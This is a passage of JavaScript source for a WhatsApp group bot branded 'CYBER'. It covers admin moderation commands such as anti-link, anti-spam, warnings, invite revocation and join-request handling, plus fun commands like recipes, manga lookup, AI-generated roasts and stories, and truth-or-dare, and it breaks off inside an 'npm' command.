    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        // Check if this group has antilink settings
        const groupSettings = antilinkSettings[m.chat] || { enabled: false, action: 'delete' };
        const status = groupSettings.enabled ? 'ON ✅' : 'OFF ❌';
        const action = groupSettings.enabled ? groupSettings.action : '-';
        
        return reply(`🔗 *Anti-Link*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ ${prefix}antilink on - Enable (delete mode)\n` +
                     `▸ ${prefix}antilink delete - Enable delete mode\n` +
                     `▸ ${prefix}antilink kick - Enable kick mode\n` +
                     `▸ ${prefix}antilink off - Disable\n\n` +
                     `⚙️ *Status:* ${status}\n` +
                     `⚙️ *Action:* ${action}\n\n` +
                     `_When enabled, links will be ${groupSettings.action === 'kick' ? 'deleted and user kicked' : 'deleted'}_`);
    }
    
    // Handle ON command (default to delete mode)
    if (args[0].toLowerCase() === 'on') {
        antilinkSettings[m.chat] = { enabled: true, action: 'delete' };
        saveAntilinkSettings(antilinkSettings);
        reply(`✅ *Anti-Link enabled (Delete mode)*\nLinks will be deleted automatically.`);
    }
    // Handle DELETE mode
    else if (args[0].toLowerCase() === 'delete') {
        antilinkSettings[m.chat] = { enabled: true, action: 'delete' };
        saveAntilinkSettings(antilinkSettings);
        reply(`✅ *Anti-Link set to DELETE mode*\nLinks will be deleted.`);
    }
    // Handle KICK mode
    else if (args[0].toLowerCase() === 'kick') {
        antilinkSettings[m.chat] = { enabled: true, action: 'kick' };
        saveAntilinkSettings(antilinkSettings);
        reply(`✅ *Anti-Link set to KICK mode*\nUsers who post links will be kicked.`);
    }
    // Handle OFF
    else if (args[0].toLowerCase() === 'off') {
        if (antilinkSettings[m.chat]) {
            antilinkSettings[m.chat].enabled = false;
            saveAntilinkSettings(antilinkSettings);
            reply(`❌ *Anti-Link disabled for this group*`);
        } else {
            reply(`⚠️ *Anti-Link is already disabled*`);
        }
    }
    else {
        reply(`❌ *Invalid option. Use: on, delete, kick, or off*`);
    }
}
break;

// ======================[ 🔍 WHOIS ]======================
case 'whois':
case 'profile': {
    // ✅ FIX: m.mentionedJid could be undefined — use optional chaining
    const user = m.mentionedJid?.[0] || m.quoted?.sender || m.sender;
    
    let pp;
    try {
        pp = await devtrust.profilePictureUrl(user, 'image');
    } catch {
        pp = 'https://files.catbox.moe/smv12k.jpeg';
    }
    
    let name = await devtrust.getName(user);
    let about = await devtrust.fetchStatus(user).catch(() => ({ status: 'No bio' }));
    
    await devtrust.sendMessage(m.chat, {
        image: { url: pp },
        caption: `👤 *User Profile*\n\n` +
                 `📛 *Name:* ${name}\n` +
                 `📱 *Number:* ${user.split('@')[0]}\n` +
                 `📝 *Bio:* ${about.status || 'No bio'}\n` +
                 `🆔 *JID:* ${user}`
    }, { quoted: m });
}
break;

// ======================[ 👥 TOTAL MEMBERS ]======================
case 'totalmembers':
case 'members': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    const groupMetadata = await devtrust.groupMetadata(m.chat);
    const total = groupMetadata.participants.length;
    const admins = groupMetadata.participants.filter(p => p.admin).length;
    
    reply(`👥 *Group Members*\n\n` +
          `📊 *Total:* ${total}\n` +
          `👑 *Admins:* ${admins}\n` +
          `👤 *Members:* ${total - admins}`);
}
break;

// ======================[ 🔗 REVOKE LINK ]======================
case 'revoke':
case 'revokelink': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to revoke the link!*");

    try {
        await devtrust.groupRevokeInvite(m.chat);
        // Small delay so WhatsApp generates the new code before we fetch it
        await new Promise(r => setTimeout(r, 1000));
        const code = await devtrust.groupInviteCode(m.chat);
        reply(`✅ *Group link reset*\n🔗 https://chat.whatsapp.com/${code}`);
    } catch (e) {
        reply(`❌ *Revoke failed:* ${e.message}`);
    }
}
break;


// ======================[ 🏷️ ANTI-TAG ]======================
case 'antitag': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        const config = getSetting(m.chat, "antitag", { enabled: false, action: 'delete' });
        return reply(`🏷️ *Anti-Tag*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ .antitag on - Enable (delete mode)\n` +
                     `▸ .antitag delete - Enable delete mode\n` +
                     `▸ .antitag kick - Enable kick mode\n` +
                     `▸ .antitag off - Disable\n\n` +
                     `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                     `⚙️ *Action:* ${config.enabled ? config.action : '-'}`);
    }
    
    if (args[0] === 'on' || args[0] === 'delete') {
        setSetting(m.chat, "antitag", { enabled: true, action: 'delete' });
        reply(`✅ *Anti-Tag enabled (Delete mode)*\nMass tagging will be deleted`);
    }
    else if (args[0] === 'kick') {
        setSetting(m.chat, "antitag", { enabled: true, action: 'kick' });
        reply(`✅ *Anti-Tag enabled (Kick mode)*\nUsers who mass tag will be kicked`);
    }
    else if (args[0] === 'off') {
        setSetting(m.chat, "antitag", { enabled: false, action: 'delete' });
        reply(`❌ *Anti-Tag disabled*`);
    }
}
break;

// ======================[ 🚫 ANTI-SPAM ]======================
case 'antispam': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        const config = getSetting(m.chat, "antispam", { enabled: false, action: 'delete' });
        return reply(`🚫 *Anti-Spam*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ .antispam on - Enable (delete mode)\n` +
                     `▸ .antispam delete - Enable delete mode\n` +
                     `▸ .antispam kick - Enable kick mode\n` +
                     `▸ .antispam off - Disable\n\n` +
                     `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                     `⚙️ *Action:* ${config.enabled ? config.action : '-'}`);
    }
    
    if (args[0] === 'on' || args[0] === 'delete') {
        setSetting(m.chat, "antispam", { enabled: true, action: 'delete' });
        reply(`✅ *Anti-Spam enabled (Delete mode)*\nSpam messages will be deleted`);
    }
    else if (args[0] === 'kick') {
        setSetting(m.chat, "antispam", { enabled: true, action: 'kick' });
        reply(`✅ *Anti-Spam enabled (Kick mode)*\nUsers who spam will be kicked`);
    }
    else if (args[0] === 'off') {
        setSetting(m.chat, "antispam", { enabled: false, action: 'delete' });
        reply(`❌ *Anti-Spam disabled*`);
    }
}
break;

// ======================[ 🤖 ANTI-BOT ]======================
case 'antibot': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        const config = getSetting(m.chat, "antibot", { enabled: false, action: 'delete' });
        return reply(`🤖 *Anti-Bot*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ .antibot on - Enable (delete mode)\n` +
                     `▸ .antibot delete - Enable delete mode\n` +
                     `▸ .antibot kick - Enable kick mode\n` +
                     `▸ .antibot off - Disable\n\n` +
                     `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                     `⚙️ *Action:* ${config.enabled ? config.action : '-'}`);
    }
    
    if (args[0] === 'on' || args[0] === 'delete') {
        setSetting(m.chat, "antibot", { enabled: true, action: 'delete' });
        reply(`✅ *Anti-Bot enabled (Delete mode)*\nBot messages will be deleted`);
    }
    else if (args[0] === 'kick') {
        setSetting(m.chat, "antibot", { enabled: true, action: 'kick' });
        reply(`✅ *Anti-Bot enabled (Kick mode)*\nBots will be kicked`);
    }
    else if (args[0] === 'off') {
        setSetting(m.chat, "antibot", { enabled: false, action: 'delete' });
        reply(`❌ *Anti-Bot disabled*`);
    }
}
break;

// ======================[ 💰 ANTI-BEG ]======================
case 'antibeg': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        const config = getSetting(m.chat, "antibeg", { enabled: false, action: 'delete' });
        return reply(`💰 *Anti-Beg (Nigerian Style)*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ .antibeg on - Enable (delete mode)\n` +
                     `▸ .antibeg delete - Enable delete mode\n` +
                     `▸ .antibeg kick - Enable kick mode\n` +
                     `▸ .antibeg off - Disable\n\n` +
                     `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                     `⚙️ *Action:* ${config.enabled ? config.action : '-'}\n\n` +
                     `_Detects "send me money", "I dey suffer", etc_`);
    }
    
    if (args[0] === 'on' || args[0] === 'delete') {
        setSetting(m.chat, "antibeg", { enabled: true, action: 'delete' });
        reply(`✅ *Anti-Beg enabled (Delete mode)*\nBegging messages will be deleted`);
    }
    else if (args[0] === 'kick') {
        setSetting(m.chat, "antibeg", { enabled: true, action: 'kick' });
        reply(`✅ *Anti-Beg enabled (Kick mode)*\nUsers who beg will be kicked`);
    }
    else if (args[0] === 'off') {
        setSetting(m.chat, "antibeg", { enabled: false, action: 'delete' });
        reply(`❌ *Anti-Beg disabled*`);
    }
}
break;

// ======================[ ⚠️ WARN COMMANDS ]======================
case 'warns':
case 'checkwarns': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    const user = m.mentionedJid[0] || m.quoted?.sender || m.sender;
    const warnCount = global.warns?.[m.chat]?.[user] || 0;
    
    reply(`⚠️ *@${user.split('@')[0]} has ${warnCount}/3 warnings*`, [user]);
}
break;

case 'resetwarns': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const user = m.mentionedJid[0] || m.quoted?.sender;
    if (!user) return reply("👤 *Mention user to reset warnings*");
    
    if (global.warns?.[m.chat]?.[user]) {
        delete global.warns[m.chat][user];
        reply(`✅ *Warnings reset for @${user.split('@')[0]}*`, [user]);
    } else {
        reply(`⚠️ *@${user.split('@')[0]} has no warnings*`, [user]);
    }
}
break;

case 'setname':
case 'setgcname': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!text) return reply(`📝 *Usage:* ${prefix}setname New Group Name`);
    
    try {
        await devtrust.groupUpdateSubject(m.chat, text);
        reply(`✅ *Group name changed to:* ${text}`);
    } catch (e) {
        reply(`❌ *Failed:* ${e.message}`);
    }
}
break;

case 'setdesc':
case 'setgcdesc': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!text) return reply(`📝 *Usage:* ${prefix}setdesc New group description`);
    
    try {
        await devtrust.groupUpdateDescription(m.chat, text);
        reply(`✅ *Group description updated*`);
    } catch (e) {
        reply(`❌ *Failed:* ${e.message}`);
    }
}
break;

case 'groupinfo':
case 'ginfo': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    const metadata = await devtrust.groupMetadata(m.chat);
    const participants = metadata.participants;
    const admins = participants.filter(p => p.admin);
    const bots = participants.filter(p => p.id.includes('bot') || p.id.includes('lid'));
    
    const info = `📊 *Group Information*
    
📌 *Name:* ${metadata.subject}
🆔 *ID:* ${metadata.id}
👑 *Owner:* @${metadata.owner?.split('@')[0] || 'Unknown'}
📅 *Created:* ${new Date(metadata.creation * 1000).toLocaleDateString()}
👥 *Members:* ${participants.length}
👮 *Admins:* ${admins.length}
🤖 *Bots:* ${bots.length}
🔒 *Restrict:* ${metadata.restrict ? 'Yes' : 'No'}
🔐 *Announce:* ${metadata.announce ? 'Yes' : 'No'}`;

    reply(info, metadata.owner ? [metadata.owner] : []);
}
break;

case 'setprefix': {
    // Any user can change their OWN prefix. Owner/Sudo can change anyone's.
    const targetUser = (isCreator || isSudo) && m.mentionedJid?.[0] ? m.mentionedJid[0] : m.sender;

    if (!args[0]) {
        const current = getUserPrefix(targetUser);
        return reply(`🔧 *Current prefix:* \`${current}\`\n\n*Usage:* ${prefix}setprefix <new>\n*Example:* ${prefix}setprefix !\n\n${(isCreator || isSudo) ? "_Owner can set prefix for others: `.setprefix ! @user`_" : ""}`);
    }

    // Take first argument only (not joined with spaces)
    const newPrefix = args[0];

    if (!newPrefix || newPrefix.length === 0) {
        return reply("❌ *Prefix cannot be empty*");
    }
    if (newPrefix.length > 5) {
        return reply("❌ *Prefix too long* (max 5 characters)");
    }
    if (newPrefix.includes(' ') || newPrefix.includes('\n')) {
        return reply("❌ *Prefix cannot contain spaces or newlines*");
    }

    // Save prefix
    setUserPrefix(targetUser, newPrefix);

    if (targetUser === m.sender) {
        prefix = newPrefix;
        reply(`✅ *Your prefix changed to* \`${newPrefix}\`\n_Use ${newPrefix}menu to see commands_\n_If you forget, type just "." to see your prefix_`);
    } else {
        reply(`✅ *Prefix for @${targetUser.split('@')[0]} set to* \`${newPrefix}\``, m.chat, { mentions: [targetUser] });
    }
}
break;

case 'gcsettings':
case 'groupsettings': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const metadata = await devtrust.groupMetadata(m.chat);
    
    const settings = `⚙️ *Group Settings*
    
🔇 *Announce:* ${metadata.announce ? 'ON (Admins only)' : 'OFF (Everyone)'}
🔒 *Restrict:* ${metadata.restrict ? 'ON (Admins only)' : 'OFF (Everyone)'}
👥 *Approve Mode:* ${metadata.approve ? 'ON' : 'OFF'}
📝 *Ephemeral:* ${metadata.ephemeralDuration ? metadata.ephemeralDuration + ' seconds' : 'OFF'}`;

    reply(settings);
}
break;

case 'setgrouppp':
case 'setgcpp': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';
    
    if (!/image/.test(mime)) return reply("🖼️ *Reply to an image*");
    
    try {
        const media = await quoted.download();
        await devtrust.updateProfilePicture(m.chat, media);
        reply('✅ *Group picture updated*');
    } catch (e) {
        reply(`❌ *Failed:* ${e.message}`);
    }
}
break;

case 'join': {
    if (!isCreator && !isSudo) return reply("🔒 *Owner/Sudo only*");
    
    if (!text) return reply(`🔗 *Usage:* ${prefix}join https://chat.whatsapp.com/xxxxxx`);
    
    const inviteCode = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
    if (!inviteCode) return reply("❌ *Invalid group link*");
    
    try {
        await reply("🔄 *Joining group...*");
        const result = await devtrust.groupAcceptInvite(inviteCode[1]);
        reply(`✅ *Joined successfully!*\n🆔 ${result}`);
    } catch (e) {
        reply(`❌ *Failed to join:* ${e.message}`);
    }
}
break;

case 'announce':
case 'announcement': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!text) return reply(`📢 *Usage:* ${prefix}announce Your message here`);
    
    const groupMetadata = await devtrust.groupMetadata(m.chat);
    const participants = groupMetadata.participants;
    
    await devtrust.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
        caption: `📢 *GROUP ANNOUNCEMENT*\n\n${text}\n\n- @${m.sender.split('@')[0]}`,
        mentions: participants.map(p => p.id)
    });
}
break;

case 'acceptall': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    try {
        const requests = await devtrust.groupRequestParticipantsList(m.chat);
        if (!requests || requests.length === 0) {
            return reply("📭 *No pending join requests*");
        }
        
        reply(`🔄 *Accepting ${requests.length} requests...*`);
        
        let accepted = 0;
        for (let req of requests) {
            if (req.requestMethod === 'invite') {
                await devtrust.groupRequestParticipantsUpdate(m.chat, [req.jid], 'accept');
                accepted++;
                await sleep(1000);
            }
        }
        
        reply(`✅ *Accepted ${accepted} join requests*`);
    } catch (e) {
        reply(`❌ *Error:* ${e.message}`);
    }
}
break;

case 'rejectall': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    try {
        const requests = await devtrust.groupRequestParticipantsList(m.chat);
        if (!requests || requests.length === 0) {
            return reply("📭 *No pending join requests*");
        }
        
        reply(`🔄 *Rejecting ${requests.length} requests...*`);
        
        let rejected = 0;
        for (let req of requests) {
            await devtrust.groupRequestParticipantsUpdate(m.chat, [req.jid], 'reject');
            rejected++;
            await sleep(1000);
        }
        
        reply(`❌ *Rejected ${rejected} join requests*`);
    } catch (e) {
        reply(`❌ *Error:* ${e.message}`);
    }
}
break;

case 'poll':
case 'createpoll': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!text || !text.includes('|')) {
        return reply(`📊 *Create a poll*\n\n` +
                     `📝 *Usage:* ${prefix}poll Question | Option1 | Option2\n` +
                     `💡 *Example:* ${prefix}poll Best color? | Red | Blue | Green`);
    }
    
    const parts = text.split('|');
    const question = parts[0].trim();
    const options = parts.slice(1).map(opt => opt.trim());
    
    if (options.length < 2) return reply("❌ *At least 2 options required*");
    if (options.length > 5) return reply("❌ *Maximum 5 options allowed*");
    
    await devtrust.sendMessage(m.chat, {
        poll: {
            name: question,
            values: options,
            selectableCount: 1
        }
    });
}
break;



case "mathfact": {
    const facts = [
        "0 is the only number that cannot be represented in Roman numerals.",
        "The sum of all numbers on a roulette wheel is 666.",
        "A 'jiffy' is an actual unit of time: 1/100th of a second.",
        "The number 1729 is the smallest number expressible as the sum of two cubes in two different ways.",
        "There are exactly 17 wallpaper groups in 2D geometry.",
        "The Fibonacci sequence appears in the arrangement of sunflower seeds.",
        "A prime number is a number greater than 1 that has no positive divisors other than 1 and itself.",
        "The number π is irrational — it cannot be expressed as a simple fraction.",
        "The sum of the first 100 natural numbers is 5050.",
        "In binary, the number 13 is written as 1101."
    ];
    const fact = facts[Math.floor(Math.random() * facts.length)];
    reply(`🧮 *CYBER Math Fact*\n\n${fact}\n\n💡 *Random number knowledge, just for you*`);
}
break;

case "recipe-ingredient": {
    if (!text) return reply("🍳 *Example:* recipe-ingredient chicken");
    
    
    try {
        const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/filter.php?i=${encodeURIComponent(text)}`);
        if (!res.data.meals) return reply(`🍽️ *No recipes found* using "${text}"`);
        
        const meals = res.data.meals
            .slice(0, 5)
            .map((m, i) => `${i+1}. *${m.strMeal}*`)
            .join("\n");
        
        const caption = `🍳 *CYBER Recipes*
        
🔍 *Ingredient:* ${text}

${meals}

🔗 *View full recipes:* https://www.themealdb.com`;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                text: caption,
                mentions: [m.sender]
            }), 
            { quoted: m }
        );
    } catch {
        reply("❌ *Recipe fetch failed* • Kitchen's closed, try again later");
    }
}
break;

case 'manga': {
    if (!text) return reply(`📖 *Usage:* ${command} <manga name>`);
    
    try {
        let res = await axios.get(`https://api.jikan.moe/v4/manga?q=${encodeURIComponent(text)}&limit=1`);
        let data = res.data.data[0];
        
        if (!data) return reply("🔍 *Manga not found* • Try a different title");
        
        let mangaInfo = `📚 *CYBER Manga*
        
📌 *${data.title}*
━━━━━━━━━━━━
📊 Score: ${data.score || "N/A"} ⭐
📚 Volumes: ${data.volumes || "N/A"}
📑 Chapters: ${data.chapters || "N/A"}
📖 Status: ${data.status || "N/A"}

📝 ${data.synopsis ? data.synopsis.substring(0, 300) + "..." : "No synopsis available"}

🔗 ${data.url}`;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: data.images.jpg.large_image_url },
                caption: mangaInfo
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("❌ *Manga fetch failed* • The manga gods are angry today");
    }
}
break;

case 'flirt': {
    const lines = [
        "Are you a magician? Because whenever I look at you, everyone else disappears.",
        "Do you have a map? I keep getting lost in your eyes.",
        "Is your name Google? Because you have everything I've been searching for.",
        "Are you made of copper and tellurium? Because you're Cu-Te.",
        "If you were a vegetable, you'd be a cute-cumber.",
        "Do you believe in love at first sight, or should I walk past again?",
        "Is your dad a baker? Because you're a cutie pie.",
        "You must be tired because you've been running through my mind all day.",
        "Are you a parking ticket? Because you've got FINE written all over you.",
        "Did it hurt when you fell from heaven?"
    ];
    reply(`💘 *Flirt:* ${lines[Math.floor(Math.random() * lines.length)]}`);
}
break;

case 'paptt': {
    if (!isCreator) return reply("🔒 *Creator only command*");
    
    global.paptt = [
        "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
        "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
        "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
        "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
        "https://telegra.ph/file/b58a5b8177521565c503b.mp4"
    ];
    
    let url = global.paptt[Math.floor(Math.random() * global.paptt.length)];
    
    if (url.includes('.')) {
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                video: { url: url },
                caption: "🎬 *CYBER Media*"
            }), 
            { quoted: m }
        );
    } else {
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: url },
                caption: "📸 *CYBER Media*"
            }), 
            { quoted: m }
        );
    }
}
break;

case "ascii": {
    if (!text) return reply("✏️ *Example:* ascii Hello World");
    
    try {
        // artii.herokuapp.com is dead, use simple text fallback
        const ascii = text.toUpperCase();
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                text: `🎨 *CYBER ASCII*\n\n\`\`\`${ascii}\`\`\``
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("ASCII ERROR:", e);
        reply("❌ *ASCII generation failed*");
    }
}
break;

case 'roast': {
    let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m.sender.split('@')[0];
    try {
        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nRoast this person in a super funny and savage way in 2-3 lines only. Be creative and witty. Target: ${target}`;
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 20000 });
        reply(`🔥 *Roast for ${target}:*\n\n${res.data}`);
    } catch (e) {
        reply("⚠️ *Roast failed* • The burn machine needs repairs");
    }
}
break;

case 'compliment': {
    let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m.sender.split('@')[0];
    try {
        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nGive a sweet, warm and genuine compliment to this person in 2 lines only: ${target}`;
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 20000 });
        reply(`💫 *Compliment for ${target}:*\n\n${res.data}`);
    } catch (e) {
        reply("⚠️ *Compliment failed* • The kindness machine is broken");
    }
}
break;
case "advice": {
    try {
        const res = await axios.get("https://api.adviceslip.com/advice");
        const advice = res.data?.slip?.advice || "Keep going!";
        reply(`💭 *CYBER Advice*\n\n"${advice}"`);
    } catch (e) {
        console.error("ADVICE ERROR:", e);
        reply("❌ *Advice machine is sleeping* • Try again later");
    }
}
break;

case "urban": {
    if (!text) return reply("📚 *Example:* urban sus");
    
    try {
        const res = await axios.get(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(text)}`);
        const defs = res.data?.list;
        if (!defs || !defs.length) return reply(`🔍 No definitions found for "${text}"`);
        
        const top = defs[0];
        const msg = `📖 *CYBER Urban*\n\n📌 *${top.word}*\n\n${top.definition}\n\n💬 *Example:* ${top.example}`;
        reply(msg);
    } catch (e) {
        console.error("URBAN ERROR:", e);
        reply("❌ *Dictionary is offline* • Try again later");
    }
}
break;

case 'ship': {
    if (!text) return reply(`💘 *Usage:* ${command} name1 & name2`);
    
    let names = text.split("&");
    if (names.length < 2) return reply("⚠️ Format: name1 & name2");
    
    let name1 = names[0].trim();
    let name2 = names[1].trim();
    
    let percentage = Math.floor(Math.random() * 100) + 1;
    let bar = "❤️".repeat(Math.floor(percentage / 10)) + "🤍".repeat(10 - Math.floor(percentage / 10));
    
    reply(`💞 *CYBER Ship*\n\n${name1} 💘 ${name2}\n\nCompatibility: *${percentage}%*\n${bar}`);
}
break;

case 'rewrite': {
    if (!text) return reply(`✍️ *Usage:* ${command} your text here`);
    try {
        const prompt = `CRITICAL: Rewrite the text in the EXACT same language and script it was written in. If the text is in Roman Urdu, keep it in Roman Urdu using English letters. NEVER convert to Hindi Devanagari script. NEVER convert to formal Urdu Nastaliq script.\n\nRewrite the following text to be clear, grammatically correct and well-structured. Only return the rewritten text, nothing else:\n"${text}"`;
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 20000 });
        reply(`✍️ *CYBER Rewrite*\n\n${res.data}`);
    } catch (e) {
        reply("⚠️ *Rewrite failed* • Editor is on break");
    }
}
break;

case 'rate': {
    if (!text) return reply(`📊 *Usage:* ${command} something to rate`);
    
    let percentage = Math.floor(Math.random() * 100) + 1;
    let bar = "⭐".repeat(Math.floor(percentage / 10)) + "✩".repeat(10 - Math.floor(percentage / 10));
    
    reply(`📊 *CYBER Rate*\n\n${text}\n\n*${percentage}%* ${bar}`);
}
break;

case "solve": {
    const a = Math.floor(Math.random() * 50) + 1;
    const b = Math.floor(Math.random() * 50) + 1;
    const answer = a + b;
    
    reply(`➕ *CYBER Math*\n\nSolve: ${a} + ${b}\nReply with: mathanswer ${answer}`);
}
break;

case 'story': {
    if (!text) return reply(`📖 *Usage:* ${command} a brave warrior`);
    
    try {
        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nWrite a short creative story (150 words max) about: ${text}. Make it engaging with a clear beginning, middle and end.`;
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
        reply(`📖 *CYBER Story*\n\n${res.data}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Storyteller is sleeping* • Try again later");
    }
}
break;

case 'cartoonify': {
    reply("⚠️ *Cartoonify temporarily disabled*\n\nThe image-to-cartoon API (itsrose.life) is currently down.\n\n*Try these instead:*\n• .wanted — wanted poster meme\n• .oogway — Master Oogway quote meme\n• .sadcat — sad cat meme");
}
break;

case 'wouldyou': {
    try {
        const questions = [
            "Fly 🕊️ or be invisible 👻?",
            "Always 10 minutes late ⏰ or 20 minutes early ⌛?",
            "Live without music 🎶 or without movies 🎥?",
            "Be rich 💰 and sad 😢, or poor 💸 but happy 😁?",
            "Eat pizza 🍕 forever or rice 🍚 forever?",
            "Time travel to past ⏳ or future 🚀?",
            "Fight 1 horse-sized duck 🦆 or 100 duck-sized horses 🐴?",
            "Never use social media 📵 or never watch TV 📺?",
            "Have super strength 💪 or super intelligence 🧠?",
            "Speak in rhymes 🎤 or sing instead of talk 🎶?"
        ];
        
        const randomQ = questions[Math.floor(Math.random() * questions.length)];
        reply(`🤔 *CYBER Would You Rather*\n\nWould you rather ${randomQ}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Question generator failed* • Try again later");
    }
}
break;

case 'truthdare': 
case 'tod': {
    const todTruths = [
        "Apni zindagi ka sabse sharmnak moment batao",
        "Kya kabhi kisi ko secretly pasand kiya? Naam batao",
        "Aaj tak ka sabse bura jhooth kya tha?",
        "Kya kabhi kisi ka message ghoor ke parha hai bina bataye?",
        "Sabse zyada kaunsi app use karte ho aur kyun sharmindagi hoti hai?",
        "Kya ek cheez hai jo family ko kabhi nahi batao ge?",
        "Last time kab roya tha aur kyun?",
        "Kya kabhi exam mein cheating ki?",
        "Sabse zyada kaunse bande/bandi se jealous ho?",
        "Apna crush batao agar hai toh"
    ];
    const todDares = [
        "Next 5 messages mein sirf emojis mein jawab do",
        "Apna sabse embarrassing photo share karo",
        "Kisi bhi group member ko abhi call karo aur 'I love you' kaho",
        "10 min ke liye apna WhatsApp status 'Main pagal hun' rakho",
        "Apni awaaz mein koi gaana record karke bhejo",
        "Kisi ko bhi puri galat spelling mein message karo",
        "1 minute mein 20 push-ups karo aur video bhejo",
        "Apne neighbour ko 'Happy Birthday' message karo",
        "Seedhi 2 minute tak hansa nahi toh out",
        "Apna WhatsApp DP 1 ghante ke liye kisi funny meme se change karo"
    ];
    
    const t = text.toLowerCase();
    const type = t.includes("truth") ? "truth" : t.includes("dare") ? "dare" : null;
    if (!type) return reply("⚠️ Choose *truth* or *dare*\nExample: .tod truth");
    
    const list = type === "truth" ? todTruths : todDares;
    const pick = list[Math.floor(Math.random() * list.length)];
    reply(`🎲 *CYBER ${type.toUpperCase()}*\n\n${pick}`);
}
break;

case 'github': {
    if (!text) return reply(`👨‍💻 *Usage:* ${command} username`);
    
    try {
        let res = await axios.get(`https://api.github.com/users/${encodeURIComponent(text)}`);
        let user = res.data;
        
        if (!user || !user.login) return reply("🔍 *User not found*");
        
        let profileInfo = `👨‍💻 *CYBER GitHub*\n\n` +
            `📌 *${user.name || user.login}*\n` +
            `📍 ${user.location || "Location hidden"}\n` +
            `📦 Repos: ${user.public_repos} | 👥 Followers: ${user.followers}\n` +
            `🔗 ${user.html_url}`;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: user.avatar_url },
                caption: profileInfo
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *GitHub fetch failed* • Try again later");
    }
}
break;

case 'npm': {
    if (!text) return reply(`📦 *Usage:* ${command} package-name`);
    
    try {
